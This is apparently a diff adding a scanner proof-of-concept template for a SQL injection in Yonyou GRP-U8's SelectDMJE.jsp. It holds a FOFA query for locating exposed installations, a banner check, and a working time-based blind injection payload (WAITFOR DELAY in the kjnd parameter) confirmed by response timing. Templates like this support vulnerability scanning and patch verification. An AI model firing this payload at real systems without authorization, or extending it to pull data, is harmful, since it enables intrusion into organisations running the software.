@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-grp-u8-selectdmje-jsp-sqli
+info:
+  name: 用友GRP-U8 SelectDMJE.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"GRP-U8")
+- method: GET
+  path: /u8qx/SelectDMJE.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: status_code == 200 && !contains(body,"<") && duration >= t1 && duration
+    < t2
+transport: http
